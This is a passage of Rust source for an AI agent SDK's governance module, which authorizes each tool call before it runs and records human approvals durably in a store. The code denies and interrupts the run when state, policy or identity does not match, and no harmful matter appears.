//! The governance harness — the flagship differentiator. A declarative permission engine,
//! *enforcing* lifecycle hooks, built-in tools, and fail-closed OS containment let a human hand an
//! agent powerful tools with explicit boundaries. It wraps the loop's tool-execution seam: every
//! tool call is authorized BEFORE it runs. A normal denial is surfaced to the model as an error
//! result; an interrupting human denial terminates the run. Neither path executes the tool.
//!
//! This is what no other multi-provider SDK ships in one package (LiteLLM = proxy guardrail,
//! Pydantic AI = approval-only, the Claude Agent SDK = Claude-only). Here it is provider-agnostic
//! and runs identically on every provider.

pub mod capability;
pub mod containment;
pub mod contracts;
pub mod egress_broker;
pub mod guardrail;
pub mod hooks;
pub mod off_prompt;
pub mod permissions;
pub mod plan;
pub mod policy;
pub mod policy_adapters;
pub mod process;
pub mod reliability;
pub mod risk;
pub mod sandbox;
pub mod skills;

pub use contracts::*;
pub use policy_adapters::*;
pub use skills::*;

use async_trait::async_trait;
use hooks::{HookDispatcher, HookOutcome, PreToolUseContext};
use permissions::{Outcome, PermissionEngine};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::BTreeMap;
use std::sync::{Arc, Mutex, RwLock};
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use thiserror::Error;

/// The decision for a single tool call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Authorization {
    /// Run the tool with this (possibly rewritten) input.
    Allowed(Value),
    /// Do not run the tool. A normal denial becomes an error tool-result; an interrupt denial
    /// terminates the run without executing the tool or asking the model for another turn.
    Denied { message: String, interrupt: bool },
}

impl Authorization {
    fn denied(message: impl Into<String>) -> Self {
        Authorization::Denied {
            message: message.into(),
            interrupt: false,
        }
    }

    fn interrupted(message: impl Into<String>) -> Self {
        Authorization::Denied {
            message: message.into(),
            interrupt: true,
        }
    }

    pub fn interrupt(&self) -> bool {
        matches!(
            self,
            Authorization::Denied {
                interrupt: true,
                ..
            }
        )
    }
}

/// Full context sent to a human/host approval callback for an `ask` rule.
#[derive(Debug, Clone)]
pub struct ApprovalRequest {
    pub run_id: String,
    pub turn: usize,
    pub tool_use_id: String,
    pub tool: String,
    pub input: Value,
}

/// A human-approved permission update scoped to the current run and the tool in the current
/// [`ApprovalRequest`]. There is deliberately no arbitrary tool/rule field: one approval callback
/// cannot silently grant a different tool or a later run. Static deny decisions remain
/// authoritative over both scopes.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionUpdate {
    /// Reuse the approval only when the post-hook, post-approval input is exactly equal.
    AllowExactInput,
    /// Reuse the approval for later calls to this same tool, regardless of input.
    AllowTool,
}

/// Human/host decision. Approval may further clamp the input. Permission updates are installed
/// only after the final input is rechecked against static deny policy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ApprovalDecision {
    Allow {
        updated_input: Option<Value>,
        updated_permissions: Vec<PermissionUpdate>,
    },
    Deny {
        message: String,
        interrupt: bool,
    },
}

impl ApprovalDecision {
    /// Allow one call without changing later permissions.
    pub fn allow(updated_input: Option<Value>) -> Self {
        ApprovalDecision::Allow {
            updated_input,
            updated_permissions: Vec::new(),
        }
    }

    /// Deny one call while preserving the existing error-tool-result behavior.
    pub fn deny(message: impl Into<String>) -> Self {
        ApprovalDecision::Deny {
            message: message.into(),
            interrupt: false,
        }
    }
}

#[async_trait]
pub trait ToolApprover: Send + Sync {
    async fn approve(&self, request: ApprovalRequest) -> ApprovalDecision;
}

#[derive(Debug, Error)]
pub enum DurableApproverError {
    #[error("durable approver requires a sealed governance policy snapshot")]
    MissingPolicySnapshot,
    #[error("durable run policy `{run_policy:?}` does not match governance policy `{governance_policy}`")]
    PolicyMismatch {
        run_policy: Option<String>,
        governance_policy: String,
    },
    #[error("durable run is missing its complete governance binding")]
    MissingGovernanceBinding,
    #[error("durable governance binding mismatch: {0}")]
    BindingMismatch(String),
    #[error("durable approval timeout must be greater than zero")]
    InvalidTimeout,
    #[error("durable run state is unavailable")]
    StateUnavailable,
    #[error("durable governance binding registry reached its fail-closed capacity of {capacity}")]
    BindingRegistryFull { capacity: usize },
    #[error(
        "durable run `{run_id}` cannot retire its governance binding while status is {status:?}"
    )]
    RunNotTerminal {
        run_id: String,
        status: crate::durability::DurableRunStatus,
    },
    #[error("terminal durable run `{run_id}` cannot be attached to governance")]
    RunTerminal { run_id: String },
    #[error("durable approval store is unavailable or out of sync: {0}")]
    Store(String),
}

/// Compatibility adapter that turns the existing callback-based approver into an append-only
/// durable approval lifecycle. Calls are serialized per run so overlapping callbacks cannot
/// accidentally resume through each other's pending approval.
#[derive(Clone)]
pub struct DurableToolApprover {
    legacy: Arc<dyn ToolApprover>,
    run: Arc<Mutex<crate::durability::RunState>>,
    governance_binding: GovernanceBinding,
    timeout: Duration,
    approval_gate: Arc<tokio::sync::Mutex<()>>,
    store: Option<Arc<dyn crate::durable_store::DurableStore>>,
    poison: Option<Arc<std::sync::atomic::AtomicBool>>,
    worker_lease: Option<crate::durable_store::DurableStoreLeaseAuthority>,
}

impl DurableToolApprover {
    pub fn new(
        legacy: Arc<dyn ToolApprover>,
        run: Arc<Mutex<crate::durability::RunState>>,
        policy_snapshot: &PolicySnapshot,
        timeout: Duration,
    ) -> Result<Self, DurableApproverError> {
        Self::new_inner(legacy, run, policy_snapshot, timeout, None, None, None)
    }

    /// Construct an adapter that commits every request/resolution through the durable store CAS
    /// boundary before exposing the new in-memory projection.
    pub fn new_persisted(
        legacy: Arc<dyn ToolApprover>,
        run: Arc<Mutex<crate::durability::RunState>>,
        policy_snapshot: &PolicySnapshot,
        timeout: Duration,
        store: Arc<dyn crate::durable_store::DurableStore>,
    ) -> Result<Self, DurableApproverError> {
        Self::new_inner(
            legacy,
            run,
            policy_snapshot,
            timeout,
            Some(store),
            None,
            None,
        )
    }

    fn new_persisted_for_driver(
        legacy: Arc<dyn ToolApprover>,
        driver: &crate::durable_runtime::DurableRunDriver,
        policy_snapshot: &PolicySnapshot,
        timeout: Duration,
    ) -> Result<Self, DurableApproverError> {
        Self::new_inner(
            legacy,
            driver.state_handle(),
            policy_snapshot,
            timeout,
            Some(driver.store_handle()),
            Some(driver.poison_handle()),
            driver.worker_lease_authority(),
        )
    }

    fn new_inner(
        legacy: Arc<dyn ToolApprover>,
        run: Arc<Mutex<crate::durability::RunState>>,
        policy_snapshot: &PolicySnapshot,
        timeout: Duration,
        store: Option<Arc<dyn crate::durable_store::DurableStore>>,
        poison: Option<Arc<std::sync::atomic::AtomicBool>>,
        worker_lease: Option<crate::durable_store::DurableStoreLeaseAuthority>,
    ) -> Result<Self, DurableApproverError> {
        if timeout.is_zero() || timeout.as_millis() == 0 {
            return Err(DurableApproverError::InvalidTimeout);
        }
        let guard = run
            .lock()
            .map_err(|_| DurableApproverError::StateUnavailable)?;
        let run_policy = guard.policy_snapshot_hash().map(str::to_owned);
        if run_policy.as_deref() != Some(policy_snapshot.hash()) {
            return Err(DurableApproverError::PolicyMismatch {
                run_policy,
                governance_policy: policy_snapshot.hash().to_owned(),
            });
        }
        let governance_binding = guard
            .governance_binding()
            .cloned()
            .ok_or(DurableApproverError::MissingGovernanceBinding)?;
        governance_binding
            .validate()
            .map_err(|error| DurableApproverError::BindingMismatch(error.to_string()))?;
        if governance_binding.run_id() != guard.run_id()
            || governance_binding.policy_snapshot_hash() != policy_snapshot.hash()
        {
            return Err(DurableApproverError::BindingMismatch(
                "run, policy, or binding identity differs".into(),
            ));
        }
        if let Some(store) = &store {
            let persisted = store
                .load(guard.run_id())
                .map_err(|error| DurableApproverError::Store(error.to_string()))?;
            if persisted != *guard {
                return Err(DurableApproverError::Store(
                    "persisted run does not match the supplied run state".into(),
                ));
            }
            store.worker_lease_clock_unix_ms().map_err(|error| {
                DurableApproverError::Store(format!(
                    "trusted approval clock is unavailable: {error}"
                ))
            })?;
            if !store.supports_atomic_approval_resolution() {
                return Err(DurableApproverError::Store(
                    "store does not provide atomic approval resolution".into(),
                ));
            }
        }
        drop(guard);
        Ok(Self {
            legacy,
            run,
            governance_binding,
            timeout,
            approval_gate: Arc::new(tokio::sync::Mutex::new(())),
            store,
            poison,
            worker_lease,
        })
    }

    pub fn run_state(&self) -> Arc<Mutex<crate::durability::RunState>> {
        self.run.clone()
    }

    fn fail_closed(message: impl Into<String>) -> ApprovalDecision {
        ApprovalDecision::Deny {
            message: message.into(),
            interrupt: true,
        }
    }

    fn commit_candidate(
        &self,
        current: &mut crate::durability::RunState,
        candidate: crate::durability::RunState,
        approval_id: Option<&str>,
    ) -> Result<(), crate::durable_store::DurableStoreError> {
        if let Some(store) = &self.store {
            let expected_sequence = current.events().last().map_or(0, |event| event.sequence);
            let persisted = match approval_id {
                Some(approval_id) => store.compare_and_swap_approval_resolution(
                    expected_sequence,
                    &candidate,
                    approval_id,
                    self.worker_lease.as_ref(),
                ),
                None => match &self.worker_lease {
                    Some(authority) => {
                        store.compare_and_swap_fenced(expected_sequence, &candidate, authority)
                    }
                    None => store.compare_and_swap(expected_sequence, &candidate),
                },
            };
            if let Err(error) = persisted {
                let definite_expiry_without_write = matches!(
                    (&error, approval_id),
                    (
                        crate::durable_store::DurableStoreError::ApprovalExpired {
                            run_id,
                            approval_id: expired_id,
                            observed_at_unix_ms,
                        },
                        Some(expected_id),
                    ) if run_id == current.run_id()
                        && expired_id == expected_id
                        && current
                            .projection()
                            .approvals
                            .get(expected_id)
                            .and_then(|approval| approval.expires_at_unix_ms)
                            .is_some_and(|expires_at| *observed_at_unix_ms >= expires_at)
                        && candidate
                            .projection()
                            .approvals
                            .get(expected_id)
                            .is_some_and(|approval| {
                                approval.status
                                    == crate::durability::DurableApprovalStatus::Approved
                            })
                );
                if !definite_expiry_without_write {
                    if let Some(poison) = &self.poison {
                        poison.store(true, std::sync::atomic::Ordering::Release);
                    }
                }
                return Err(error);
            }
        }
        *current = candidate;
        Ok(())
    }

    fn verify_current(&self, current: &crate::durability::RunState) -> Result<(), String> {
        if self
            .poison
            .as_ref()
            .is_some_and(|poison| poison.load(std::sync::atomic::Ordering::Acquire))
        {
            return Err("durable driver is poisoned; reload state before approval".into());
        }
        let Some(store) = &self.store else {
            return Ok(());
        };
        match store.load(current.run_id()) {
            Ok(stored) if stored == *current => Ok(()),
            Ok(_) => {
                if let Some(poison) = &self.poison {
                    poison.store(true, std::sync::atomic::Ordering::Release);
                }
                Err("durable approval state no longer matches the store".into())
            }
            Err(error) => {
                if let Some(poison) = &self.poison {
                    poison.store(true, std::sync::atomic::Ordering::Release);
                }
                Err(format!(
                    "durable approval store could not be loaded: {error}"
                ))
            }
        }
    }

    fn approval_clock_unix_ms(&self) -> Result<u64, String> {
        let Some(store) = &self.store else {
            return unix_time_ms();
        };
        store.worker_lease_clock_unix_ms().map_err(|error| {
            format!("durable approval trusted store clock is unavailable: {error}")
        })
    }
}

#[async_trait]
impl ToolApprover for DurableToolApprover {
    async fn approve(&self, request: ApprovalRequest) -> ApprovalDecision {
        if self
            .poison
            .as_ref()
            .is_some_and(|poison| poison.load(std::sync::atomic::Ordering::Acquire))
        {
            return Self::fail_closed(
                "durable driver is poisoned; reload state before requesting approval",
            );
        }
        let _gate = self.approval_gate.lock().await;
        let request_for_callback = request.clone();
        let requested_at_unix_ms = match self.approval_clock_unix_ms() {
            Ok(now) => now,
            Err(message) => return Self::fail_closed(message),
        };
        let expected_payload = serde_json::json!({
            "turn": request.turn,
            "tool_use_id": request.tool_use_id,
            "tool": request.tool,
            "input": request.input,
        });
        let timeout_ms = u64::try_from(self.timeout.as_millis()).unwrap_or(u64::MAX);
        let proposed_expiry = requested_at_unix_ms.saturating_add(timeout_ms);
        let (approval_id, expires_at_unix_ms) = {
            let mut run = match self.run.lock() {
                Ok(run) => run,
                Err(_) => return Self::fail_closed("durable approval state is unavailable"),
            };
            if let Err(error) = self.verify_current(&run) {
                return Self::fail_closed(error);
            }
            if run.run_id() != request.run_id {
                return Self::fail_closed(format!(
                    "approval run `{}` does not match durable run `{}`",
                    request.run_id,
                    run.run_id()
                ));
            }
            if run.governance_binding() != Some(&self.governance_binding) {
                return Self::fail_closed(
                    "durable run governance binding changed after approver attachment",
                );
            }
            let existing = run
                .projection()
                .approvals
                .values()
                .filter(|approval| approval.logical_key == request.tool_use_id)
                .cloned()
                .collect::<Vec<_>>();
            if existing.len() > 1 {
                return Self::fail_closed("durable approval identity is ambiguous");
            }
            if let Some(existing) = existing.into_iter().next() {
                if existing.governance_binding.as_ref() != Some(&self.governance_binding)
                    || existing.policy_snapshot_hash.as_deref()
                        != Some(self.governance_binding.policy_snapshot_hash())
                    || existing.payload != expected_payload
                {
                    return Self::fail_closed(
                        "durable approval replay does not match the current governed action",
                    );
                }
                match existing.status {
                    crate::durability::DurableApprovalStatus::Approved => {
                        return durable_approval_decision(&existing)
                            .unwrap_or_else(Self::fail_closed)
                    }
                    crate::durability::DurableApprovalStatus::Rejected => {
                        return durable_approval_decision(&existing)
                            .unwrap_or_else(Self::fail_closed)
                    }
                    crate::durability::DurableApprovalStatus::Pending => {
                        let Some(expires_at) = existing.expires_at_unix_ms else {
                            return Self::fail_closed(
                                "durable approval is missing its expiration clock",
                            );
                        };
                        (existing.approval_id, expires_at)
                    }
                }
            } else {
                let mut candidate = run.clone();
                match candidate.request_typed_approval(crate::durability::DurableApprovalRequest {
                    logical_key: request.tool_use_id.clone(),
                    activity_id: None,
                    kind: crate::durability::DurableApprovalKind::Confirmation,
                    prompt: format!("Allow tool `{}`?", request.tool),
                    payload: expected_payload.clone(),
                    policy_snapshot_hash: Some(
                        self.governance_binding.policy_snapshot_hash().to_owned(),
                    ),
                    governance_binding: Some(self.governance_binding.clone()),
                    requested_at_unix_ms,
                    expires_at_unix_ms: proposed_expiry,
                }) {
                    Ok(approval_id) => {
                        if let Err(error) = self.commit_candidate(&mut run, candidate, None) {
                            return Self::fail_closed(format!(
                                "durable approval request could not be committed: {error}"
                            ));
                        }
                        (approval_id, proposed_expiry)
                    }
                    Err(error) => {
                        return Self::fail_closed(format!(
                            "durable approval request could not be recorded: {error}"
                        ))
                    }
                }
            }
        };

        let remaining_ms = expires_at_unix_ms.saturating_sub(requested_at_unix_ms);
        let callback = if remaining_ms == 0 {
            None
        } else {
            tokio::time::timeout(
                Duration::from_millis(remaining_ms),
                self.legacy.approve(request_for_callback),
            )
            .await
            .ok()
        };
        let (decision, approved, response, timed_out) = match callback {
            Some(decision @ ApprovalDecision::Allow { .. }) => {
                let response = approval_decision_payload(&decision);
                (decision, true, response, false)
            }
            Some(decision @ ApprovalDecision::Deny { .. }) => {
                let response = approval_decision_payload(&decision);
                (decision, false, response, false)
            }
            None => (
                ApprovalDecision::deny("approval timed out"),
                false,
                Some(serde_json::json!({"reason": "approval_timeout"})),
                true,
            ),
        };
        let resolved_at_unix_ms = if timed_out {
            expires_at_unix_ms
        } else {
            match self.approval_clock_unix_ms() {
                Ok(now) => now,
                Err(message) => return Self::fail_closed(message),
            }
        };
        let durable_outcome = self.run.lock().map_err(|_| ()).and_then(|mut run| {
            let command_id = format!("approval:{approval_id}");
            let mut candidate = run.clone();
            candidate
                .apply_command_at(
                    crate::durability::RunCommand::Resume {
                        command_id: command_id.clone(),
                        approvals: vec![crate::durability::ApprovalResolution {
                            approval_id: approval_id.clone(),
                            approved,
                            response,
                        }],
                    },
                    resolved_at_unix_ms,
                )
                .map_err(|_| ())?;
            let resolved = &candidate.projection().approvals[&approval_id];
            let outcome = (resolved.status, resolved.timed_out);
            match self.commit_candidate(&mut run, candidate, Some(&approval_id)) {
                Ok(()) => Ok(outcome),
                Err(crate::durable_store::DurableStoreError::ApprovalExpired {
                    run_id: expired_run_id,
                    approval_id: expired_id,
                    observed_at_unix_ms,
                }) if expired_run_id == run.run_id()
                    && expired_id == approval_id
                    && outcome == (crate::durability::DurableApprovalStatus::Approved, false)
                    && run
                        .projection()
                        .approvals
                        .get(&approval_id)
                        .and_then(|approval| approval.expires_at_unix_ms)
                        .is_some_and(|expires_at| observed_at_unix_ms >= expires_at)
                    && self.poison.as_ref().is_none_or(|poison| {
                        !poison.load(std::sync::atomic::Ordering::Acquire)
                    }) =>
                {
                    let mut timeout_candidate = run.clone();
                    if timeout_candidate
                        .apply_command_at(
                            crate::durability::RunCommand::Resume {
                                command_id,
                                approvals: vec![crate::durability::ApprovalResolution {
                                    approval_id: approval_id.clone(),
                                    approved: false,
                                    response: Some(serde_json::json!({
                                        "reason": "approval_timeout"
                                    })),
                                }],
                            },
                            observed_at_unix_ms,
                        )
                        .is_err()
                    {
                        if let Some(poison) = &self.poison {
                            poison.store(true, std::sync::atomic::Ordering::Release);
                        }
                        return Err(());
                    }
                    let resolved = &timeout_candidate.projection().approvals[&approval_id];
                    let outcome = (resolved.status, resolved.timed_out);
                    self.commit_candidate(&mut run, timeout_candidate, Some(&approval_id))
                        .map_err(|_| ())?;
                    Ok(outcome)
                }
                Err(_) => Err(()),
            }
        });
        match durable_outcome {
            Ok((crate::durability::DurableApprovalStatus::Approved, false)) => decision,
            Ok((crate::durability::DurableApprovalStatus::Rejected, true)) => {
                ApprovalDecision::deny("approval timed out")
            }
            Ok((crate::durability::DurableApprovalStatus::Rejected, false)) => decision,
            Ok((crate::durability::DurableApprovalStatus::Pending, _))
            | Ok((crate::durability::DurableApprovalStatus::Approved, true))
            | Err(()) => Self::fail_closed("durable approval resolution could not be recorded"),
        }
    }
}

fn unix_time_ms() -> Result<u64, String> {
    let millis = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_err(|_| "system clock is before the Unix epoch".to_string())?
        .as_millis();
    u64::try_from(millis).map_err(|_| "system clock exceeds durable timestamp range".to_string())
}

fn approval_decision_payload(decision: &ApprovalDecision) -> Option<Value> {
    match decision {
        ApprovalDecision::Allow {
            updated_input,
            updated_permissions,
        } => Some(serde_json::json!({
            "decision": "allow",
            "updated_input": updated_input,
            "updated_permissions": updated_permissions.iter().map(|permission| match permission {
                PermissionUpdate::AllowExactInput => "allow_exact_input",
                PermissionUpdate::AllowTool => "allow_tool",
            }).collect::<Vec<_>>(),
        })),
        ApprovalDecision::Deny { message, interrupt } => Some(serde_json::json!({
            "decision": "deny",
            "message": message,
            "interrupt": interrupt,
        })),
    }
}

fn durable_approval_decision(
    approval: &crate::durability::DurableApproval,
) -> Result<ApprovalDecision, String> {
    if approval.timed_out {
        return Ok(ApprovalDecision::deny("approval timed out"));
    }
    let response = approval
        .response
        .as_ref()
        .and_then(Value::as_object)
        .ok_or_else(|| "durable approval response is missing".to_string())?;
    match response.get("decision").and_then(Value::as_str) {
        Some("allow") if approval.status == crate::durability::DurableApprovalStatus::Approved => {
            let updated_input = response
                .get("updated_input")
                .cloned()
                .filter(|value| !value.is_null());
            let permissions = response
                .get("updated_permissions")
                .and_then(Value::as_array)
                .ok_or_else(|| "durable approval permissions are malformed".to_string())?
                .iter()
                .map(|permission| match permission.as_str() {
                    Some("allow_exact_input") => Ok(PermissionUpdate::AllowExactInput),
                    Some("allow_tool") => Ok(PermissionUpdate::AllowTool),
                    _ => Err("durable approval permission is unknown".to_string()),
                })
                .collect::<Result<Vec<_>, _>>()?;
            Ok(ApprovalDecision::Allow {
                updated_input,
                updated_permissions: permissions,
            })
        }
        Some("deny") if approval.status == crate::durability::DurableApprovalStatus::Rejected => {
            let message = response
                .get("message")
                .and_then(Value::as_str)
                .ok_or_else(|| "durable denial message is missing".to_string())?;
            let interrupt = response
                .get("interrupt")
                .and_then(Value::as_bool)
                .ok_or_else(|| "durable denial interrupt flag is missing".to_string())?;
            Ok(ApprovalDecision::Deny {
                message: message.into(),
                interrupt,
            })
        }
        _ => Err("durable approval status and response disagree".into()),
    }
}

/// Context needed for enforcing hooks and an optional approval callback.
#[derive(Debug, Clone)]
pub struct AuthorizationContext {
    pub run_id: String,
    pub turn: usize,
    pub tool_use_id: String,
    pub tool: String,
    pub input: Value,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuthorizationReport {
    pub authorization: Authorization,
    pub interrupt: bool,
    pub pre_hook_outcome: &'static str,
    pub permission_outcome: &'static str,
    pub permission_source: String,
}

#[derive(Debug, Clone, PartialEq)]
struct ApprovedPermission {
    run_id: String,
    tool: String,
    scope: PermissionUpdate,
    input: Option<Value>,
    source: String,
}

#[derive(Debug, Default)]
struct ApprovedPermissionSet {
    grants: Vec<ApprovedPermission>,
}

impl ApprovedPermissionSet {
    fn matching_source(&self, run_id: &str, tool: &str, input: &Value) -> Option<String> {
        self.grants.iter().rev().find_map(|grant| {
            if grant.run_id != run_id || grant.tool != tool {
                return None;
            }
            let matches = match grant.scope {
                PermissionUpdate::AllowTool => true,
                PermissionUpdate::AllowExactInput => grant.input.as_ref() == Some(input),
            };
            matches.then(|| grant.source.clone())
        })
    }

    fn insert(&mut self, grant: ApprovedPermission) {
        if !self.grants.iter().any(|existing| {
            existing.run_id == grant.run_id
                && existing.tool == grant.tool
                && existing.scope == grant.scope
                && existing.input == grant.input
        }) {
            self.grants.push(grant);
        }
    }
}

/// The governance bundle threaded through the agent loop: enforcing hooks + a permission engine.
/// The default is fully permissive (allow-all, no hooks) so ungoverned agents behave as before.
#[derive(Clone)]
struct DurableApproverAuthority {
    run: Arc<Mutex<crate::durability::RunState>>,
    store: Option<Arc<dyn crate::durable_store::DurableStore>>,
    poison: Option<Arc<std::sync::atomic::AtomicBool>>,
    worker_lease: Option<crate::durable_store::DurableStoreLeaseAuthority>,
}

#[derive(Default, Clone)]
pub struct Governance {
    pub permissions: PermissionEngine,
    pub hooks: HookDispatcher,
    approver: Option<Arc<dyn ToolApprover>>,
    approved_permissions: Arc<RwLock<ApprovedPermissionSet>>,
    policy_snapshot: Option<PolicySnapshot>,
    tenant_id: Option<String>,
    agent_id: Option<String>,
    durable_binding: Option<GovernanceBinding>,
    durable_run: Option<Arc<Mutex<crate::durability::RunState>>>,
    durable_store: Option<Arc<dyn crate::durable_store::DurableStore>>,
    durable_approver_authority: Option<DurableApproverAuthority>,
    durable_bindings: Arc<RwLock<BTreeMap<String, GovernanceBinding>>>,
    binding_violation: Option<String>,
}

/// A hard fail-closed ceiling. Bindings are security state and therefore cannot be silently
/// evicted while a run may still resume; terminal runs must be retired explicitly.
pub const MAX_REGISTERED_DURABLE_BINDINGS: usize = 4_096;

impl Governance {
    pub fn new(permissions: PermissionEngine, hooks: HookDispatcher) -> Self {
        Governance {
            permissions,
            hooks,
            approver: None,
            approved_permissions: Arc::new(RwLock::new(ApprovedPermissionSet::default())),
            policy_snapshot: None,
            tenant_id: None,
            agent_id: None,
            durable_binding: None,
            durable_run: None,
            durable_store: None,
            durable_approver_authority: None,
            durable_bindings: Arc::new(RwLock::new(BTreeMap::new())),
            binding_violation: None,
        }
    }

    pub fn with_approver(mut self, approver: Arc<dyn ToolApprover>) -> Self {
        if self.durable_binding.is_some() {
            self.binding_violation =
                Some("durable approver cannot be replaced after governance binding".into());
        }
        self.approver = Some(approver);
        self.durable_approver_authority = None;
        self
    }

    /// Wrap an existing callback approver with durable request/resolution recording.
    pub fn with_durable_approver(
        mut self,
        approver: Arc<dyn ToolApprover>,
        run: Arc<Mutex<crate::durability::RunState>>,
        timeout: Duration,
    ) -> Result<Self, DurableApproverError> {
        self.ensure_run_authority(&run)?;
        if self.durable_store.is_some() {
            return Err(DurableApproverError::Store(
                "cannot replace a persisted durable authority with an in-memory approver".into(),
            ));
        }
        let snapshot = self
            .policy_snapshot
            .as_ref()
            .ok_or(DurableApproverError::MissingPolicySnapshot)?;
        let binding = self.validate_run_binding(&run)?;
        let durable_approver = DurableToolApprover::new(approver, run.clone(), snapshot, timeout)?;
        self.register_durable_binding(&binding)?;
        self.approver = Some(Arc::new(durable_approver));
        self.durable_binding = Some(binding);
        self.durable_run = Some(run.clone());
        self.durable_approver_authority = Some(DurableApproverAuthority {
            run,
            store: None,
            poison: None,
            worker_lease: None,
        });
        Ok(self)
    }

    /// Durable approver variant that persists each event-log transition with store-level CAS.
    pub fn with_persisted_durable_approver(
        mut self,
        approver: Arc<dyn ToolApprover>,
        run: Arc<Mutex<crate::durability::RunState>>,
        timeout: Duration,
        store: Arc<dyn crate::durable_store::DurableStore>,
    ) -> Result<Self, DurableApproverError> {
        self.ensure_run_authority(&run)?;
        self.ensure_store_authority(&store)?;
        let snapshot = self
            .policy_snapshot
            .as_ref()
            .ok_or(DurableApproverError::MissingPolicySnapshot)?;
        let binding = self.validate_run_binding(&run)?;
        let durable_approver = DurableToolApprover::new_persisted(
            approver,
            run.clone(),
            snapshot,
            timeout,
            store.clone(),
        )?;
        self.register_durable_binding(&binding)?;
        self.approver = Some(Arc::new(durable_approver));
        self.durable_binding = Some(binding);
        self.durable_run = Some(run.clone());
        self.durable_store = Some(store.clone());
        self.durable_approver_authority = Some(DurableApproverAuthority {
            run,
            store: Some(store),
            poison: None,
            worker_lease: None,
        });
        Ok(self)
    }

    /// Attach governance to the exact state and store authority owned by a durable runtime.
    /// Governed state must match policy hash, tenant, agent, and run identity exactly. A run and
    /// governance configuration with no policy on either side remains ungoverned.
    pub fn with_durable_driver(
        mut self,
        driver: &crate::durable_runtime::DurableRunDriver,
    ) -> Result<Self, DurableApproverError> {
        let run = driver.state_handle();
        let store = driver.store_handle();
        self.ensure_run_authority(&run)?;
        self.ensure_store_authority(&store)?;
        self.ensure_driver_approver_authority(driver)?;

        let run_binding = run
            .lock()
            .map_err(|_| DurableApproverError::StateUnavailable)?
            .governance_binding()
            .cloned();
        match (run_binding.is_some(), self.policy_snapshot.is_some()) {
            (true, true) => {
                self = self.with_durable_run(run.clone())?;
            }
            (true, false) => return Err(DurableApproverError::MissingPolicySnapshot),
            (false, true) => return Err(DurableApproverError::MissingGovernanceBinding),
            (false, false) => {
                if self.durable_binding.is_some()
                    || self.tenant_id.is_some()
                    || self.agent_id.is_some()
                    || self.binding_violation.is_some()
                {
                    return Err(DurableApproverError::BindingMismatch(
                        "ungoverned durable run received partially configured governance identity"
                            .into(),
                    ));
                }
                self.durable_run = Some(run.clone());
            }
        }
        self.durable_store = Some(store);
        Ok(self)
    }

    /// Install a durable callback approver that shares the driver's exact state, store, and CAS
    /// poison authority. No copied `RunState` is introduced.
    pub fn with_persisted_durable_driver_approver(
        mut self,
        approver: Arc<dyn ToolApprover>,
        driver: &crate::durable_runtime::DurableRunDriver,
        timeout: Duration,
    ) -> Result<Self, DurableApproverError> {
        let durable_approver = {
            let snapshot = self
                .policy_snapshot
                .as_ref()
                .ok_or(DurableApproverError::MissingPolicySnapshot)?;
            DurableToolApprover::new_persisted_for_driver(approver, driver, snapshot, timeout)?
        };
        self.approver = Some(Arc::new(durable_approver));
        self.durable_approver_authority = Some(DurableApproverAuthority {
            run: driver.state_handle(),
            store: Some(driver.store_handle()),
            poison: Some(driver.poison_handle()),
            worker_lease: driver.worker_lease_authority(),
        });
        self = self.with_durable_driver(driver)?;
        Ok(self)
    }

    /// Attach a replayed durable run even when its policy never asks for human approval. This makes
    /// the event-sourced binding available to every subsequent authorization check.
    pub fn with_durable_run(
        mut self,
        run: Arc<Mutex<crate::durability::RunState>>,
    ) -> Result<Self, DurableApproverError> {
        self.ensure_run_authority(&run)?;
        let binding = self.validate_run_binding(&run)?;
        self.register_durable_binding(&binding)?;
        self.durable_binding = Some(binding);
        self.durable_run = Some(run);
        Ok(self)
    }

    /// Attach the sealed policy that will be cloned unchanged into each invocation.
    pub fn with_policy_snapshot(mut self, policy_snapshot: PolicySnapshot) -> Self {
        if self
            .durable_binding
            .as_ref()
            .is_some_and(|binding| binding.policy_snapshot_hash() != policy_snapshot.hash())
        {
            self.binding_violation =
                Some("policy snapshot changed after durable governance binding".into());
            return self;
        }
        self.policy_snapshot = Some(policy_snapshot);
        self
    }

    /// Bind tenant/agent scopes used when evaluating the sealed policy. The run and tool scopes
    /// come from each [`AuthorizationContext`].
    pub fn with_policy_identity(
        mut self,
        tenant_id: Option<String>,
        agent_id: Option<String>,
    ) -> Self {
        if self.durable_binding.as_ref().is_some_and(|binding| {
            binding.tenant_id() != tenant_id.as_deref() || binding.agent_id() != agent_id.as_deref()
        }) {
            self.binding_violation =
                Some("policy identity changed after durable governance binding".into());
            return self;
        }
        self.tenant_id = tenant_id;
        self.agent_id = agent_id;
        self
    }

    pub fn policy_snapshot(&self) -> Option<&PolicySnapshot> {
        self.policy_snapshot.as_ref()
    }

    pub fn policy_snapshot_hash(&self) -> Option<&str> {
        self.policy_snapshot.as_ref().map(PolicySnapshot::hash)
    }

    /// Construct a durable run whose first post-start event pins this governance policy.
    pub fn start_durable_run(
        &self,
        session_id: impl Into<String>,
        run_id: impl Into<String>,
        durability: crate::durability::DurabilityMode,
    ) -> crate::durability::DurabilityResult<crate::durability::RunState> {
        let snapshot = self.policy_snapshot.as_ref().ok_or_else(|| {
            crate::durability::DurabilityError::InvalidEvent {
                reason: "governed durable run requires a sealed policy snapshot".into(),
            }
        })?;
        let run_id = run_id.into();
        if let Some(reason) = &self.binding_violation {
            return Err(crate::durability::DurabilityError::InvalidEvent {
                reason: format!("durable governance binding is invalid: {reason}"),
            });
        }
        if self
            .durable_binding
            .as_ref()
            .is_some_and(|binding| binding.run_id() != run_id)
        {
            return Err(crate::durability::DurabilityError::InvalidEvent {
                reason: "governance instance is already bound to another durable run".into(),
            });
        }
        let binding = GovernanceBinding::seal(
            snapshot.hash(),
            self.tenant_id.clone(),
            self.agent_id.clone(),
            run_id.clone(),
        )
        .map_err(|error| crate::durability::DurabilityError::InvalidEvent {
            reason: format!("invalid governance binding: {error}"),
        })?;
        let run = crate::durability::RunState::new_with_governance_binding(
            session_id, run_id, durability, binding,
        )?;
        self.register_durable_binding(
            run.governance_binding()
                .expect("new governed run has a binding"),
        )
        .map_err(|error| crate::durability::DurabilityError::InvalidEvent {
            reason: error.to_string(),
        })?;
